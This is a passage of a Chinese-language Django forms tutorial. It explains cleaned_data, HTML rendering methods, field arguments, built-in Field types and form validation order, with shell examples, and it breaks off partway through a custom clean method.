如果数据没有通过验证,cleaned_data字典中只包含合法的字段:
>>> data = {'subject': '', 'message': 'Hi there', 'sender': 'invalid email address', 'cc_myself': True}
>>> f = ContactForm(data)
>>> f.is_valid()   # False
>>> f.cleaned_data # {'cc_myself': True, 'message': 'Hi there'}

cleaned_data字典始终只包含Form中定义的字段,即使在构建Form时传递了额外的数据。 在下面的例子中传递了一组额外的字段给ContactForm构造函数,但是cleaned_data将只包含表单的字段:

>>> data = {'subject': 'hello','message': 'Hi there','sender': 'foo@example.com','cc_myself': True,'extra_field_1': 'foo','extra_field_2': 'bar','extra_field_3': 'baz'}
>>> f = ContactForm(data)
>>> f.is_valid()  # True
>>> f.cleaned_data # Doesn't contain extra_field_1, etc.
{'cc_myself': True, 'message': 'Hi there', 'sender': 'foo@example.com', 'subject': 'hello'}

当Form通过验证后cleaned_data将包含所有字段的键和值,即使传递的数据中没有提供某些字段的值。 在下面的例子中提供的实际数据中不包含nick_name字段,但是cleaned_data任然包含它,只是值为空:

>>> from django import forms
>>> class OptionalPersonForm(forms.Form):
...     first_name = forms.CharField()
...     last_name = forms.CharField()
...     nick_name = forms.CharField(required=False)
>>> data = {'first_name': 'John', 'last_name': 'Lennon'}
>>> f = OptionalPersonForm(data)
>>> f.is_valid()   # True
>>> f.cleaned_data # {'nick_name': '', 'first_name': 'John', 'last_name': 'Lennon'}

表单的HTML生成方式
Form的第二个任务是将它渲染成HTML代码,默认情况下根据form类中字段的编写顺序,在HTML中以同样的顺序罗列

</pre><pre class="html"
>>> f = ContactForm()
>>> print(f)
<tr><th><label for="id_subject">Subject:</label></th><td>< input id="id_subject" type="text" name="subject" maxlength="100" required /></td></tr>
<tr><th><label for="id_message">Message:</label></th><td>< input type="text" name="message" id="id_message" required /></td></tr>
<tr><th><label for="id_sender">Sender:</label></th><td>< input type="email" name="sender" id="id_sender" required /></td></tr>
<tr><th><label for="id_cc_myself">Cc myself:</label></th><td>< input type="checkbox" name="cc_myself" id="id_cc_myself" /></td></tr>

# 如果表单是绑定的,输出的HTML将包含数据。
>>> data = {'subject': 'hello','message': 'Hi there','sender': 'foo@example.com','cc_myself': True}
>>> f = ContactForm(data)
>>> print(f)
<tr><th><label for="id_subject">Subject:</label></th><td>< input id="id_subject" type="text" name="subject" maxlength="100" value="hello" required /></td></tr>
<tr><th><label for="id_message">Message:</label></th><td>< input type="text" name="message" id="id_message" value="Hi there" required /></td></tr>
<tr><th><label for="id_sender">Sender:</label></th><td>< input type="email" name="sender" id="id_sender" value="foo@example.com" required /></td></tr>
<tr><th><label for="id_cc_myself">Cc myself:</label></th><td>< input type="checkbox" name="cc_myself" id="id_cc_myself" checked /></td></tr>

</pre><pre>
为了灵活性,输出不包含table和form以及< input type="submit">标签,需要手动添加它们。
每个字段类型都默认由一个默认的HTML标签展示,可以使用Widget特别指定。
每个HTML标签的name属性名直接从ContactForm类中获取。
form使用HTML5语法,顶部需添加< !DOCTYPE html>说明。

1. 渲染成文字段落as_p()
Form.as_p()
该方法将form渲染成一系列p标签,每个p标签包含一个字段;

</pre><textarea>
>>> f = ContactForm()
>>> f.as_p()
'< p>< label for="id_subject">Subject:< /label> < input id="id_subject" type="text" name="subject" maxlength="100" required />< /p>\n< p>< label for="id_message">Message:< /label> < input type="text" name="message" id="id_message" required />< /p>\n< p>< label for="id_sender">Sender:< /label> < input type="text" name="sender" id="id_sender" required />< /p>\n< p>< label for="id_cc_myself">Cc myself:< /label> < input type="checkbox" name="cc_myself" id="id_cc_myself" />< /p>'
>>> print(f.as_p())
< p>< label for="id_subject">Subject:< /label> < input id="id_subject" type="text" name="subject" maxlength="100" required />< /p>
< p>< label for="id_message">Message:< /label> < input type="text" name="message" id="id_message" required />< /p>
< p>< label for="id_sender">Sender:< /label> < input type="email" name="sender" id="id_sender" required />< /p>
< p>< label for="id_cc_myself">Cc myself:< /label> < input type="checkbox" name="cc_myself" id="id_cc_myself" />< /p>

</textarea><pre>
2. 渲染成无序列表as_ul()
Form.as_ul()
该方法将form渲染成一系列li标签,每个li标签包含一个字段。但不会自动生成< /ul>和< ul>,所以可以自己指定< ul>的任何HTML属性:

</pre><textarea>
>>> f = ContactForm()
>>> f.as_ul()
'< li>< label for="id_subject">Subject:< /label> < input id="id_subject" type="text" name="subject" maxlength="100" required />< /li>\n< li>< label for="id_message">Message:< /label> < input type="text" name="message" id="id_message" required />< /li>\n< li>< label for="id_sender">Sender:< /label> < input type="email" name="sender" id="id_sender" required />< /li>\n< li>< label for="id_cc_myself">Cc myself:< /label> < input type="checkbox" name="cc_myself" id="id_cc_myself" />< /li>'
>>> print(f.as_ul())
< li>< label for="id_subject">Subject:< /label> < input id="id_subject" type="text" name="subject" maxlength="100" required />< /li>
< li>< label for="id_message">Message:< /label> < input type="text" name="message" id="id_message" required />< /li>
< li>< label for="id_sender">Sender:< /label> < input type="email" name="sender" id="id_sender" required />< /li>
< li>< label for="id_cc_myself">Cc myself:< /label> < input type="checkbox" name="cc_myself" id="id_cc_myself" />< /li>

</textarea><pre>
3. 渲染成表格as_table()
Form.as_table()
渲染成HTML表格。它与print完全相同,事实上当print一个表单对象时,在后台调用的就是as_table()方法:

</pre><textarea>
>>> f = ContactForm()
>>> f.as_table()
'< tr>< th>< label for="id_subject">Subject:< /label>< /th>< td>< input id="id_subject" type="text" name="subject" maxlength="100" required />< /td>< /tr>\n< tr> < th>< label for="id_message">Message:< /label>< /th>< td>< input type="text" name="message" id="id_message" required />< /td>< /tr>\n< tr>< th>< label for="id_sender">Sender:< /label>< /th>< td>< input type="email" name="sender" id="id_sender" required />< /td>< /tr>\n< tr>< th>< label for="id_cc_myself">Cc myself:< /label>< / th>< td>< input type="checkbox" name="cc_myself" id="id_cc_myself" />< /td>< /tr>'
>>> print(f)
< tr>< th>< label for="id_subject">Subject:< /label>< /th>< td>< input id="id_subject" type="text" name="subject" maxlength="100" required />< /td>< /tr>
< tr>< th>< label for="id_message">Message:< /label>< /th>< td>< input type="text" name="message" id="id_message" required />< /td>< /tr>
< tr>< th>< label for="id_sender">Sender:< /label>< /th>< td>< input type="email" name="sender" id="id_sender" required />< /td>< /tr>
< tr>< th>< label for="id_cc_myself">Cc myself:< /label>< /th>< td>< input type="checkbox" name="cc_myself" id="id_cc_myself" />< /td>< /tr>

</textarea><pre>
为表单错误信息添加CSS样式
Form.error_css_class
Form.required_css_class

为一些特别强调的或需要额外显示的内容设置醒目的CSS样式是一种常用做法,也是非常有必要的。比如给必填字段加粗显示,设置错误文字为红色等
Form.error_css_class和Form.required_css_class属性就是做这个用的:

</pre><textarea>
from django import forms

class ContactForm(forms.Form):
    error_css_class = 'error'
    required_css_class = 'required'

    # ... and the rest of your fields here

</textarea><pre>
属性名是固定的,不可变,通过赋值不同的字符串,表示给这两类属性添加不同的CSS的class属性。以后Django在渲染form成HTML时将自动为error和required行添加对应的CSS样式。

</pre>上面的例子其HTML看上去将类似<textarea>
>>> f = ContactForm(data)
>>> print(f.as_table())
< tr class="required">< th>< label class="required" for="id_subject">Subject:< /label>    ...
< tr class="required">< th>< label class="required" for="id_message">Message:< /label>    ...
< tr class="required error">< th>< label class="required" for="id_sender">Sender:< /label>      ...
< tr>< th>< label for="id_cc_myself">Cc myself:< label> ...
>>> f['subject'].label_tag()
< label class="required" for="id_subject">Subject:< /label>
>>> f['subject'].label_tag(attrs={'class': 'foo'})
< label for="id_subject" class="foo required">Subject:< /label>

</textarea><pre>
将上传的文件绑定到表单
处理带有FileField和ImageField字段的表单比普通的表单要稍微复杂一点。
首先为了上传文件需要确保form元素定义enctype为"multipart/form-data":
< form enctype="multipart/form-data" method="post" action="/foo/">

其次当使用表单时需要绑定文件数据,文件数据的处理与普通的表单数据是分开的,所以如果表单包含FileField和ImageField,绑定表单时需要指定第二个参数

</pre><textarea>
# 为表单绑定image字段
>>> from django.core.files.uploadedfile import SimpleUploadedFile
>>> data = {'subject': 'hello',
...         'message': 'Hi there',
...         'sender': 'foo@example.com',
...         'cc_myself': True}
>>> file_data = {'mugshot': SimpleUploadedFile('face.jpg', < file data>)}
>>> f = ContactFormWithMugshot(data, file_data)

# 实际上一般使用request.FILES作为文件数据的源:
# Bound form with an image field, data from the request
>>> f = ContactFormWithMugshot(request.POST, request.FILES)

# 构造一个未绑定的表单和往常一样,将表单数据和文件数据同时省略:
# Unbound form with an image field
>>> f = ContactFormWithMugshot()

</textarea><pre>
Django表单字段汇总
Field.clean(value)
虽然表单字段的Field类主要使用在Form类中,但也可以直接实例化它们来使用,以便更好地了解它们是如何工作的。每个Field的实例都有一个clean()方法,它接受一个参数,然后返回"清洁的"数据或抛出一个django.forms.ValidationError异常,这个clean方法经常被用来在开发或测试过程中对数据进行验证和测试

>>> from django import forms
>>> f = forms.EmailField()
>>> f.clean('foo@example.com') # 'foo@example.com'
>>> f.clean('invalid email address') # ValidationError: ['Enter a valid email address.']

一、核心字段参数
以下的参数是每个Field类都可以使用的。

1. required
给字段添加必填属性

>>> from django import forms
>>> f = forms.CharField()
>>> f.clean('foo') # 'foo'
>>> f.clean('') # ValidationError: ['This field is required.']
>>> f.clean(None) # ValidationError: ['This field is required.']
>>> f.clean(' ')  # ' '
>>> f.clean(0) # '0'
>>> f.clean(True) # 'True'
>>> f.clean(False) # 'False'

若要表示一个字段不是必需的,设置required=False:
>>> f = forms.CharField(required=False)
>>> f.clean('foo') # 'foo'
>>> f.clean('') # ''
>>> f.clean(None) # ''
>>> f.clean(0) # '0'
>>> f.clean(True) # 'True'
>>> f.clean(False) # 'False'

2. label
label参数用来给字段添加提示信息。如果没有设置这个参数,那么就用字段的首字母大写名字

</pre><textarea>
>>> from django import forms
>>> class CommentForm(forms.Form):
...     name = forms.CharField(label='Your name')
...     url = forms.URLField(label='Your website', required=False)
...     comment = forms.CharField()
>>> f = CommentForm(auto_id=False)
>>> print(f)
<tr><th>Your name:</th><td><input type="text" name="name" required /></td></tr>
<tr><th>Your website:</th><td><input type="url" name="url" /></td></tr>
<tr><th>Comment:</th><td><input type="text" name="comment" required /></td></tr>

</textarea><pre>
3. label_suffix
Django默认为上面的label参数后面加个冒号后缀,如果想自定义可以使用label_suffix参数

</pre><textarea>
>>> class ContactForm(forms.Form):
...     age = forms.IntegerField()
...     nationality = forms.CharField()
...     captcha_answer = forms.IntegerField(label='2 + 2', label_suffix=' =')
>>> f = ContactForm(label_suffix='?')
>>> print(f.as_p())
<p><label for="id_age">Age?</label> <input id="id_age" name="age" type="number" required /></p>
<p><label for="id_nationality">Nationality?</label> <input id="id_nationality" name="nationality" type="text" required /></p>
<p><label for="id_captcha_answer">2 + 2 =</label> <input id="id_captcha_answer" name="captcha_answer" type="number" required /></p>

</textarea><pre>
4. initial
为HTML页面中表单元素定义初始值,也就是input元素的value参数的值

</pre><textarea>
>>> from django import forms
>>> class CommentForm(forms.Form):
...     name = forms.CharField(initial='Your name')
...     url = forms.URLField(initial='http://')
...     comment = forms.CharField()
>>> f = CommentForm(auto_id=False)
>>> print(f)
<tr><th>Name:</th><td><input type="text" name="name" value="Your name" required /></td></tr>
<tr><th>Url:</th><td><input type="url" name="url" value="http://" required /></td></tr>
<tr><th>Comment:</th><td><input type="text" name="comment" required /></td></tr>

# 可能会问为什么不在渲染表单的时候传递一个包含初始化值的字典给它,不是更方便？因为这么做将触发表单的验证过程,此时输出的HTML页面将包含验证中产生的错误

>>> class CommentForm(forms.Form):
...     name = forms.CharField()
...     url = forms.URLField()
...     comment = forms.CharField()
>>> default_data = {'name': 'Your name', 'url': 'http://'}
>>> f = CommentForm(default_data, auto_id=False)
>>> print(f)
<tr><th>Name:</th><td><input type="text" name="name" value="Your name" required /></td></tr>
<tr><th>Url:</th><td><ul class="errorlist"><li>Enter a valid URL.</li></ul><input type="url" name="url" value="http://" required /></td></tr>
<tr><th>Comment:</th><td><ul class="errorlist"><li>This field is required.</li></ul><input type="text" name="comment" required /></td></tr>

# 这就是为什么initial参数只用在未绑定的表单上。
# 如果提交表单时某个字段的值没有填写,initial的值不会作为"默认"的数据。initial值只用于原始表单的显示:

>>> class CommentForm(forms.Form):
...     name = forms.CharField(initial='Your name')
...     url = forms.URLField(initial='http://')
...     comment = forms.CharField()
>>> data = {'name': '', 'url': '', 'comment': 'Foo'}
>>> f = CommentForm(data)
>>> f.is_valid()
False
# The form does *not* fall back to using the initial values.
>>> f.errors
{'url': ['This field is required.'], 'name': ['This field is required.']}

# 除了常量之外还可以传递一个可调用的对象:
>>> import datetime
>>> class DateForm(forms.Form):
...     day = forms.DateField(initial=datetime.date.today)
>>> print(DateForm())
<tr><th>Day:</th><td><input type="text" name="day" value="12/23/2008" required /><td></tr>

</textarea><pre>
5. widget
最重要的参数之一,指定渲染Widget时使用的widget类,这个form字段在HTML页面中是显示为文本输入框？密码输入框？单选按钮？多选框？还是别的

不要将Widget与表单的fields字段混淆。表单字段负责验证输入并直接在模板中使用。而Widget负责渲染网页上HTML表单的输入元素和提取提交的原始数据。widget是字段的一个内在属性,用于定义字段在浏览器的页面里以何种HTML元素展现

$ python3 manage.py shell
>>> from django import forms
>>> list(filter(lambda x : 'Input' in x, dir(forms)))
['CheckboxInput', 'ClearableFileInput', 'DateInput', 'DateTimeInput', 'EmailInput', 'FileInput', 'HiddenInput', 'MultipleHiddenInput', 'NumberInput', 'PasswordInput', 'TextInput', 'TimeInput', 'URLInput']
>>> list(filter(lambda x : 'Field' in x,dir(forms)))
['BooleanField', 'BoundField', 'CharField', 'ChoiceField', 'ComboField', 'DateField', 'DateTimeField', 'DecimalField', 'DurationField', 'EmailField', 'Field', 'FileField', 'FilePathField', 'FloatField', 'GenericIPAddressField', 'ImageField', 'IntegerField', 'ModelChoiceField', 'ModelMultipleChoiceField', 'MultiValueField', 'MultipleChoiceField', 'NullBooleanField', 'RegexField', 'SlugField', 'SplitDateTimeField', 'TimeField', 'TypedChoiceField', 'TypedMultipleChoiceField', 'URLField', 'UUIDField']

指定使用的widget
每个字段都有一个默认的widget类型。如果想要使用一个不同的Widget,可以在定义字段时使用widget参数:
comment = forms.CharField(widget=forms.Textarea) # 使用Textarea Widget来展现表单的评论字段,而不是默认的TextInput Widget。

设置widget的参数
许多widget具有可选的额外参数,下面的示例中设置了SelectDateWidget的years属性,注意参数的传递方法:

</pre><textarea>
from django import forms

BIRTH_YEAR_CHOICES = ('1980', '1981', '1982')
FAVORITE_COLORS_CHOICES = (
    ('blue', 'Blue'),
    ('green', 'Green'),
    ('black', 'Black'),
)

class SimpleForm(forms.Form):
    birth_year = forms.DateField(widget=forms.SelectDateWidget(years=BIRTH_YEAR_CHOICES))
    favorite_colors = forms.MultipleChoiceField(
        required=False,
        widget=forms.CheckboxSelectMultiple,
        choices=FAVORITE_COLORS_CHOICES,
    )

</textarea><pre>
为widget添加CSS样式
默认当Django渲染Widget为实际的HTML代码时不会添加任何的CSS样式,也就是说网页上所有的TextInput元素的外观是一样的。

</pre><textarea>
from django import forms

class CommentForm(forms.Form):
    name = forms.CharField()
    url = forms.URLField()
    comment = forms.CharField()

# 这个表单包含三个默认的TextInput Widget,以默认的方式渲染,没有CSS类、没有额外的属性。每个Widget的输入框将渲染得一模一样,丑陋又单调:
>>> f = CommentForm(auto_id=False)
>>> f.as_table()
< tr>< th>Name:< /th>< td>< input type="text" name="name" required />< /td>< /tr>
< tr>< th>Url:< /th>< td>< input type="url" name="url" required />< /td>< /tr>
< tr>< th>Comment:< /th>< td>< input type="text" name="comment" required />< /td>< /tr>

# 可以在创建Widget时使用Widget.attrs参数来实现css这一目的:
class CommentForm(forms.Form):
    name = forms.CharField(widget=forms.TextInput(attrs={'class': 'special'}))
    url = forms.URLField()
    comment = forms.CharField(widget=forms.TextInput(attrs={'size': '40'}))

# 渲染后的结果:
>>> f = CommentForm(auto_id=False)
>>> f.as_table()
< tr>< th>Name:< /th>< td>< input type="text" name="name" class="special" required />< /td>< /tr>
< tr>< th>Url:< /th>< td>< input type="url" name="url" required />< /td>< /tr>
< tr>< th>Comment:< /th>< td>< input type="text" name="comment" size="40" required />< /td>< /tr>

</textarea><pre>
6. help_text
该参数用于设置字段的辅助描述文本。

</pre><textarea>
>>> from django import forms
>>> class HelpTextContactForm(forms.Form):
...     subject = forms.CharField(max_length=100, help_text='100 characters max.')
...     message = forms.CharField()
...     sender = forms.EmailField(help_text='A valid email address, please.')
...     cc_myself = forms.BooleanField(required=False)
>>> f = HelpTextContactForm(auto_id=False)
>>> print(f.as_table())
< tr>< th>Subject:< /th>< td>< input type="text" name="subject" maxlength="100" required />< br />< span class="helptext">1 00 c haracters max.< /span >< /td>< /tr>
< tr>< th>Message:< /th>< td>< input type="text" name="message" required />< /td>< /tr>
< tr>< th>Sender:< /th>< td>< input type="email" name="sender" required />< br />A valid email address, please.< /td>< /tr>
< tr>< th>Cc myself:< /th>< td>< input type="checkbox" name="cc_myself" />< /td>< /tr>

</textarea><pre>
7. error_messages
该参数允许覆盖字段引发异常时的默认信息。传递的是一个字典,其键为想覆盖的错误信息,例如下面是默认的错误信息:

>>> from django import forms
>>> generic = forms.CharField()
>>> generic.clean('')  # ValidationError: ['This field is required.']

而下面是自定义的错误信息:
>>> name = forms.CharField(error_messages={'required': 'Please enter your name'})
>>> name.clean('')  # ValidationError: ['Please enter your name']

userPassword = forms.CharField(label='登录密码',min_length= 6,max_length = 20,error_messages = {'min_length':'密码至少6位','max_length':'密码最长20位'})
num = forms.IntegerField(error_messages={'required': '数字不能空.', 'invalid': '必须输入数字'})

8. validators
指定一个列表,其中包含了为字段进行验证的函数。如果自定义了验证方法,不用Django内置的验证功能,那么要通过这个参数将字段和自定义的验证方法链接起来。
>>> from django.core import validators
>>> print([e for e in dir(validators) if not e.startswith('_')])
['BaseValidator', 'DecimalValidator', 'EMPTY_VALUES', 'EmailValidator', 'FileExtensionValidator', 'MaxLengthValidator', 'MaxValueValidator', 'MinLengthValidator', 'MinValueValidator', 'Path', 'ProhibitNullCharactersValidator', 'RegexValidator', 'SimpleLazyObject', 'URLValidator', 'ValidationError', 'deconstructible', 'get_available_image_extensions', 'int_list_validator', 'integer_validator', 'ip_address_validator_map', 'ip_address_validators', 'ipaddress', 'is_valid_ipv6_address', 'ngettext_lazy', 're', 'slug_re', 'slug_unicode_re', 'urlsplit', 'urlunsplit', 'validate_comma_separated_integer_list', 'validate_email', 'validate_image_file_extension', 'validate_integer', 'validate_ipv46_address', 'validate_ipv4_address', 'validate_ipv6_address', 'validate_slug', 'validate_unicode_slug']

slug = forms.CharField(validators=[validators.validate_slug])

9. localize
localize参数帮助实现表单数据输入的本地化。

10. disabled
设置有该属性的字段在前端页面中将显示为不可编辑状态。
该参数接收布尔值,当设置为True时使用HTML的disabled属性禁用表单域,以使用户无法编辑该字段。即使非法篡改了前端页面的属性,向服务器提交了该字段的值,也将依然被忽略。

二、 Django表单内置的Field类
1. BooleanField
默认的Widget:CheckboxInput
空值(当输入为空时返回的值以及采取何种验证方式):False
规范化(转换为Python的何种对象)为:Python的True或False
可用的错误信息键(该字段可自定义错误信息的类型(字典的键)):required

2. CharField
默认的Widget:TextInput
空值:与empty_value给出的任何值。
规范化为:一个Unicode对象。
验证max_length或min_length,如果设置了这两个参数,否则所有的输入都是合法的。
可用的错误信息键:min_length, max_length, required
有四个可选参数:
max_length,min_length:设置字符串的最大和最小长度。
strip:默认True()表示去除输入的前导和尾随空格。
empty_value:用来表示"空"的值, 默认为空字符串。

3. ChoiceField
默认的Widget:Select
空值:''(一个空字符串)
规范化为:一个Unicode对象。
验证给定的值是否在选项列表中。
可用的错误信息键:required, invalid_choice
参数choices:用来作为该字段选项的一个二元组组成的可迭代对象(例如,列表或元组)或者一个可调用对象。格式与用于和ORM模型字段的choices参数相同。

4. TypedChoiceField
像ChoiceField一样,只是还有两个额外的参数:coerce和empty_value。
默认的Widget:Select
空值:empty_value参数设置的值。
规范化为:coerce参数类型的值。
验证给定的值在选项列表中存在并且可以被强制转换。
可用的错误信息的键:required, invalid_choice

5. DateField
默认的Widget:DateInput
空值:None
规范化为:datetime.date对象。
验证给出的值是一个datetime.date、datetime.datetime 或指定日期格式的字符串。
错误信息的键:required, invalid
接收一个可选的参数:input_formats。一个格式的列表,用于转换字符串为datetime.date对象。

如果没有提供input_formats,默认的输入格式为:
['%Y-%m-%d',      # '2006-10-25'
 '%m/%d/%Y',      # '10/25/2006'
 '%m/%d/%y']      # '10/25/06'

另外,如果在设置中指定USE_L10N=False,以下的格式也将包含在默认的输入格式中:
['%b %d %Y',      # 'Oct 25 2006'
 '%b %d, %Y',     # 'Oct 25, 2006'
 '%d %b %Y',      # '25 Oct 2006'
 '%d %b, %Y',     # '25 Oct, 2006'
 '%B %d %Y',      # 'October 25 2006'
 '%B %d, %Y',     # 'October 25, 2006'
 '%d %B %Y',      # '25 October 2006'
 '%d %B, %Y']     # '25 October, 2006'

6. DateTimeField
默认的Widget:DateTimeInput
空值:None
规范化为:Python的datetime.datetime对象。
验证给出的值是一个datetime.datetime、datetime.date或指定日期格式的字符串。
错误信息的键:required, invalid
接收一个可选的参数:input_formats

如果没有提供input_formats,默认的输入格式为:
['%Y-%m-%d %H:%M:%S',    # '2006-10-25 14:30:59'
 '%Y-%m-%d %H:%M',       # '2006-10-25 14:30'
 '%Y-%m-%d',             # '2006-10-25'
 '%m/%d/%Y %H:%M:%S',    # '10/25/2006 14:30:59'
 '%m/%d/%Y %H:%M',       # '10/25/2006 14:30'
 '%m/%d/%Y',             # '10/25/2006'
 '%m/%d/%y %H:%M:%S',    # '10/25/06 14:30:59'
 '%m/%d/%y %H:%M',       # '10/25/06 14:30'
 '%m/%d/%y']             # '10/25/06'

7. DecimalField
默认的Widget:当Field.localize是False时为NumberInput,否则为TextInput。
空值:None
规范化为:Python decimal对象。
验证给定的值为一个十进制数。 忽略前导和尾随的空白。
错误信息的键:max_whole_digits, max_digits, max_decimal_places,max_value, invalid, required,min_value
接收四个可选的参数:
max_value,min_value:允许的值的范围,需要赋值decimal.Decimal对象,不能直接给个整数类型。
max_digits:值允许的最大位数(小数点之前和之后的数字总共的位数,前导的零将被删除)。
decimal_places:允许的最大小数位。

8. DurationField
默认的Widget:TextInput
空值:None
规范化为:Python timedelta。
验证给出的值是一个字符串,而且可以转换为timedelta对象。
错误信息的键:required, invalid.

9. EmailField
默认的Widget:EmailInput
空值:''(一个空字符串)
规范化为:Unicode对象。
使用正则表达式验证给出的值是一个合法的邮件地址。
错误信息的键:required, invalid
两个可选的参数用于验证,max_length 和min_length。

10. FileField
默认的Widget:ClearableFileInput
空值:None
规范化为:一个UploadedFile对象,它封装文件内容和文件名到一个对象内。
验证非空的文件数据已经绑定到表单。
错误信息的键:missing, invalid, required, empty, max_length
具有两个可选的参数用于验证:max_length 和 allow_empty_file。

11. FilePathField
默认的Widget:Select
空值:None
规范化为:Unicode对象。
验证选择的选项在选项列表中存在。
错误信息的键:required, invalid_choice
这个字段允许从一个特定的目录选择文件。 它有五个额外的参数,其中的path是必须的:
path:要列出的目录的绝对路径。 这个目录必须存在。
recursive:如果为False(默认值)只用直接位于path下的文件或目录作为选项。如果为True将递归访问这个目录,其内所有的子目录和文件都将作为选项。
match:正则表达模式;只有具有与此表达式匹配的文件名称才被允许作为选项。
allow_files:可选。默认为True。表示是否应该包含指定位置的文件。它和allow_folders必须有一个为True。
allow_folders可选。默认为False。表示是否应该包含指定位置的目录。

12. FloatField
默认的Widget:当Field.localize是False时为NumberInput,否则为TextInput。
空值:None
规范化为:Float对象。
验证给定的值是一个浮点数。
错误信息的键:max_value, invalid, required, min_value
接收两个可选的参数用于验证,max_value和min_value,控制允许的值的范围。

13. ImageField
默认的Widget:ClearableFileInput
空值:None
规范化为:一个UploadedFile 象,它封装文件内容和文件名为一个单独的对象。
验证文件数据已绑定到表单,并且该文件是Pillow可以解析的图像格式。
错误信息的键:missing, invalid, required, empty, invalid_image
使用ImageField需要安装Pillow(pip install pillow)。如果在上传图片时遇到图像损坏错误,通常意味着使用了Pillow不支持的格式。

14. IntegerField
默认的Widget:当Field.localize是False时为NumberInput,否则为TextInput。
空值:None
规范化为:Python 整数或长整数。
验证给定值是一个整数。 允许前导和尾随空格,类似Python的int()函数。
错误信息的键:max_value, invalid, required, min_value
两个可选参数:max_value和min_value,控制允许的值的范围。

15. GenericIPAddressField
包含IPv4或IPv6地址的字段。
默认的Widget:TextInput
空值:''(一个空字符串)
规范化为:一个Unicode对象。
验证给定值是有效的IP地址。
错误信息的键:required, invalid
有两个可选参数:protocol和unpack_ipv4

16. MultipleChoiceField
默认的Widget:SelectMultiple
空值:[](一个空列表)
规范化为:一个Unicode对象列表。
验证给定值列表中的每个值都存在于选择列表中。
错误信息的键:invalid_list, invalid_choice, required

17. TypedMultipleChoiceField
类似MultipleChoiceField,除了需要两个额外的参数,coerce和empty_value。
默认的Widget:SelectMultiple
空值:empty_value
规范化为:coerce参数提供的类型值列表。
验证给定值存在于选项列表中并且可以强制。
错误信息的键:required, invalid_choice

18. NullBooleanField
默认的Widget:NullBooleanSelect
空值:None
规范化为:Python None, False或True值。
不验证任何内容(即它从不引发ValidationError)

19.RegexField
默认的Widget:TextInput
空值:''(一个空字符串)
规范化为:一个Unicode对象。
验证给定值与某个正则表达式匹配。
错误信息的键:required, invalid
需要一个必需的参数:regex,需要匹配的正则表达式。
还可以接收max_length,min_length和strip参数,类似CharField。

20. SlugField
默认的Widget:TextInput
空值:''(一个空字符串)
规范化为:一个Unicode对象。
验证给定的字符串只包括字母、数字、下划线及连字符。
错误信息的键:required, invalid
此字段用于在表单中表示模型的SlugField。

21. TimeField
默认的Widget:TextInput
空值:None
规范化为:一个Python 的datetime.time对象。
验证给定值是datetime.time或以特定时间格式格式化的字符串。
错误信息的键:required, invalid
接收一个可选的参数:input_formats,用于尝试将字符串转换为有效的datetime.time对象的格式列表。

如果没有提供input_formats,默认的输入格式为:
'%H:%M:%S',     # '14:30:59'
'%H:%M',        # '14:30'

22. URLField
默认的Widget:URLInput
空值:''(一个空字符串)
规范化为:一个Unicode对象。
验证给定值是个有效的URL。
错误信息的键:required, invalid
可选参数:max_length和min_length

23. UUIDField
默认的Widget:TextInput
空值:''(一个空字符串)
规范化为:UUID对象。
错误信息的键:required, invalid

24. ComboField
默认的Widget:TextInput
空值:''(一个空字符串)
规范化为:Unicode对象。
根据指定为ComboField的参数的每个字段验证给定值。
错误信息的键:required, invalid
接收一个额外的必选参数:fields,用于验证字段值的字段列表(按提供它们的顺序)。
>>> from django.forms import ComboField
>>> f = ComboField(fields=[CharField(max_length=20), EmailField()])
>>> f.clean('test@example.com')
'test@example.com'
>>> f.clean('longemailaddress@example.com')
ValidationError: ['Ensure this value has at most 20 characters (it has 28).']

25. MultiValueField
默认的Widget:TextInput
空值:''(一个空字符串)
规范化为:子类的compress方法返回的类型。
根据指定为MultiValueField的参数的每个字段验证给定值。
错误信息的键:incomplete, invalid, required

26. SplitDateTimeField
默认的Widget:SplitDateTimeWidget
空值:None
规范化为:Python datetime.datetime对象。
验证给定的值是datetime.datetime或以特定日期时间格式格式化的字符串。
错误信息的键:invalid_date, invalid, required, invalid_time

创建自定义字段
如果内置的Field真的不能满足需求还可以自定义Field。
只需要创建一个django.forms.Field的子类,并实现clean()和__init__()构造方法。__init__()构造方法需要接收前面提过的那些核心参数,比如widget、required,、label、help_text、initial。
还可以通过覆盖get_bound_field()方法来自定义访问字段的方式。

</pre><textarea>
from django import forms
from captcha.fields import CaptchaField

class UserForm(forms.Form):
    username = forms.CharField(
        label='用户名',
        max_length=128,
        widget=forms.TextInput(attrs={'class': 'form-control', 'placeholder': 'username', 'autofocus': ''})
    )
    password = forms.CharField(
        label='密码',
        max_length=256,
        widget=forms.PasswordInput(attrs={'class': 'form-control','placeholder': 'password'})
    )
    captcha = CaptchaField(label='验证码')

</textarea><pre>
【 form表单验证顺序 】
流程详解
1、full_clean()依次调用每个field的clean()函数,该函数针对field的max_length,unique等约束进行验证,如果验证成功则返回值并放入form的cleaned_data字典中,否则抛出ValidationError错误
2、如果每个field的内置clean()函数没有抛出ValidationError错误,则调用自定义field验证函数clean_fieldname(),验证处理方式同上
3、最后调用form的clean()函数,而不是field的clean(),如果clean没有错误那么它将返回cleaned_data字典。
4、如果到这一步没有ValidationError抛出,那么cleaned_data字典就填满了有效数据,否则cleaned_data不存在,form的另外一个字典errors填上验证错误。在template中每个field获取自己错误的方式是：{{ form.username.errors }}。
5、如果有错误is_valid()返回False,否则返回True。

自定义验证机制时:clean()和clean_&()的最后必须返回验证完毕或修改后的值

Raising ValidationError
raise ValidationError(_('Invalid value')) # Wrap the message with gettext to enable translation
raise ValidationError(_('Invalid value'), code='invalid') # Provide a descriptive error code to the constructor
raise ValidationError(_('Invalid value: %(value)s'), params={'value': '42'})
raise ValidationError(_('Invalid value: %(value)s'), code='invalid', params={'value': '42'})
raise ValidationError([
    ValidationError(_('Error 1'), code='error1'),
    ValidationError(_('Error 2'), code='error2'),
])

</pre><textarea>
from django import forms
from django.contrib.auth.models import User
from django.core.exceptions import ValidationError
import re

def mobile_validate(value):
    mobile_re = re.compile(r'^(13[0-9]|15[012356789]|17[678]|18[0-9]|14[57])[0-9]{8}$')
    if not mobile_re.match(value):
        raise ValidationError('手机号码格式错误')

class LoginForm(forms.Form):
    user = forms.CharField(required=True, error_messages={'required': '用户名不能为空.'})
    pwd = forms.CharField(min_length=6, max_length=10, error_messages={'required': '密码不能为空.', 'min_length': "至少6位"})
    pwd2 = forms.CharField(min_length=6, max_length=10, error_messages={'required': '密码不能为空.', 'min_length': "至少6位"})
    num = forms.IntegerField(error_messages={'required': '数字不能空.', 'invalid': '必须输入数字'})
    phone = forms.CharField(validators=[mobile_validate, ], )

    def clean_user(self):
        user = self.cleaned_data.get('user')
